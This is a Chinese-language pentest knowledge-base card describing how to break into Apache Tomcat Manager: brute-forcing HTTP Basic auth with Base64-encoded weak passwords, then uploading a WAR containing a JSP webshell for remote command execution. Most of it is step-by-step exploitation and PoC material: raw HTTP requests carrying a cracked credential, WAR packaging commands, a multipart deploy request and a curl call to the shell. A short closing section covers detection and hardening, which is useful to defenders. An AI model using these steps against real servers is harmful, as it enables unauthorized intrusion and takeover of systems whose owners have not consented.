---
id: web-java-component-tomcat-manager-basic-weak-auth-war-deploy
title: Tomcat Manager 弱口令（HTTP Basic base64 变形）+ WAR 部署 getshell
type: scenario
domain: web
path: web/java/component/tomcat
technique: tomcat-manager-basic-weak-auth-war-deploy
tags:
- tomcat
- manager
- http-basic
- weak-password
- brute-force
- war-deploy
- webshell
- java
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W5
  verified_at: '2026-11-08T14:39:00+08:00'
  notes: 已对照原文与图25/26/27/28/29核对：/manager/html Basic 认证、Intruder payload 加 Base64-encode 规则爆破（图25）、命中后 200（图26）、CyberChef 解 base64 得 tomcat:qwe123（图27）、Manager 部署页含「要部署的 WAR 文件」区块（图28）、部署后访问 JSP 执行（图29）均一致。未验证点：卡内 PoC 的 POST /manager/html/upload?CSRF_NONCE 与 curl 指令为按 Tomcat 通用格式整理，原文用管理台图形界面部署；未复跑；原文未给 Tomcat 版本，未设 affected_versions。
url: /docs/web/java/component/tomcat/web-java-component-tomcat-manager-basic-weak-auth-war-deploy/
draft: false
kb_aliases:
- Tomcat manager/html 弱口令
- Tomcat 后台爆破 base64
- manager-gui 弱口令
- WAR 部署 webshell
- Tomcat 管理台 getshell
- tomcat 弱口令 qwe123
---

## 一句话结论

Tomcat 的 `/manager/html`（或 `/manager/text`）只靠 HTTP Basic 认证保护，账号密码来自 `conf/tomcat-users.xml` 里的 `manager-gui`/`manager-script` 角色；当运维给了弱口令时，把 `用户名:密码` 做 Base64 放进 `Authorization` 头即可爆破进去，随后用管理台的 WAR 部署功能上传一个内含 JSP webshell 的 war 包，Tomcat 会自动解包到 `webapps/` 并注册 context，访问对应路径即得到命令执行。

## 原理

- HTTP Basic 认证的凭据是 `Authorization: Basic base64(user:password)`，服务端只做一次解码与比对，没有会话、验证码、频控等附加环节，因此适合字典爆破；工具里「Base64 编码 payload」只是让字典直接生成合法头部，并非加密。
- Tomcat Manager 的权限模型是角色制：`manager-gui` 允许访问 HTML 管理页，`manager-script` 允许 `/manager/text/deploy` 等文本接口；只要账号带这两个角色之一，就有部署应用的权限。
- WAR 部署的语义是「把 war 放进 `webapps/` 并展开」：管理台上传 war 后 Tomcat 会解压、创建 context、启动应用；war 内任意一个 `.jsp` 都会被 Jasper 编译执行，因此把冰蝎/哥斯拉等一句话 webshell 打成 war 就是标准 getshell 路径。
- 之所以成立：管理台把「部署应用」这一高权限操作暴露给 HTTP 层，凭据强度是唯一门槛；弱口令 + 默认开启的 manager 应用 = 直接 RCE。若 `/manager` 被删除或只监听内网，则需要其它入口（如文件上传、反序列化）才能拿到同等能力。

## 触发条件

- 目标暴露 `/manager/html` 或 `/manager/text`（默认发行包自带，很多镜像未移除）。
- `conf/tomcat-users.xml` 中存在带 `manager-gui` / `manager-script` / `manager-jmx` 角色的用户，且口令在常见弱口令字典内。
- 攻击者能访问管理台端口（直接暴露或经代理/端口转发）。
- 上传的 war 能被部署（`autoDeploy`/`deployOnStartup` 开启，或有权限通过管理台 deploy）。

## 利用步骤

1. 访问 `/manager/html`，确认返回 `401` 且带 `WWW-Authenticate: Basic realm="Tomcat Manager Application"`，说明管理台存在。
2. 用「用户名 + 弱口令」字典生成 `user:pass` 列表，逐条 Base64 后放进 `Authorization` 头爆破；响应从 `401` 变为 `200`（或返回管理页面 HTML）即为命中。
3. 用命中凭据登录 `/manager/html`，确认账号具备部署权限（页面出现「WAR file to deploy」区块）。
4. 生成 war：把冰蝎/哥斯拉生成的 JSP 一句话放在 war 内任意路径（如 `shell.jsp`），打包为 zip 后改后缀为 `.war`。
5. 在管理台「WAR file to deploy」选择该 war 并部署，或用 `/manager/text/deploy?path=/x&update=true` 以 PUT 方式上传部署。
6. 访问 `http://target/x/shell.jsp`，用客户端连接执行命令；确认权限后清理部署（`/manager/text/undeploy?path=/x`）。

## PoC

```http
GET /manager/html HTTP/1.1
Host: target
Authorization: Basic dG9tY2F0OnF3ZTEyMw==
```

```bash
# 字典 → Base64 头（user:pass 形式，工具里直接用 Base64-encode 规则生成）
printf 'tomcat:qwe123' | base64        # dG9tY2F0OnF3ZTEyMw==
```

```text
# 命中后返回 200，页面为 Tomcat Web 应用程序管理器（含「WAR file to deploy」区块）
```

```bash
# 打包 war（war 本质是 zip；内含 shell.jsp）
mkdir -p war/shell && cp shell.jsp war/shell/
cd war && zip -r ../shell.war . && cd ..
```

```http
POST /manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=<nonce> HTTP/1.1
Host: target
Authorization: Basic dG9tY2F0OnF3ZTEyMw==
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="deployWar"; filename="shell.war"
Content-Type: application/octet-stream

<war 二进制>
--X--
```

```bash
# 访问部署后的路径
curl -u tomcat:qwe123 'http://target/shell/shell.jsp'
```

## 变体与关联

- 变体：走 `/manager/text/deploy?path=/x`（`manager-script` 角色，PUT 上传 war，适合脚本化）；或 `manager-jmx` 角色的 JMX 代理接口。
- 变体：war 内放 `WEB-INF/web.xml` + servlet 类，或只放 JSP（最省事）；Tomcat 9/10 对 JSP 的编译与路径规则一致。
- 变体：管理台不在默认路径时，可先读 `conf/tomcat-users.xml`（拿到口令）或 `conf/server.xml`（确认端口与 context），再回到本卡。
- 关联：`[[web-java-component-tomcat-webxml-jsp-servlet-xml-pattern-webshell]]` 是「已能读 tomcat-users.xml 后改 conf/web.xml」的另一条落地路径；`[[web-java-component-tomcat-cve-2017-12615-put-jsp-upload]]` 是不依赖管理台的 PUT 上传路径。
- 边界：`/manager` 被移除、manager 角色账号不存在、强口令且无泄露、管理台只监听内网且无代理入口、`deployXML`/`deployWAR` 被禁用时失效。

## 检测与防御

- 检测：`/manager/html`、`/manager/text` 上大量 401 与少量 200；`Authorization: Basic` 头部高频轮换；随后出现 WAR 上传与 `webapps/` 新目录、新 JSP 文件。
- 修复：生产环境删除 `/manager` 与 `/host-manager` 应用；确需保留时改强口令、仅绑定内网、限制来源 IP。
- 加固：`tomcat-users.xml` 中只保留必要的 `manager-script` 且不与 `manager-gui` 混用；开启访问日志与部署审计；用 WAF 对 `/manager/*` 的爆破做频控。
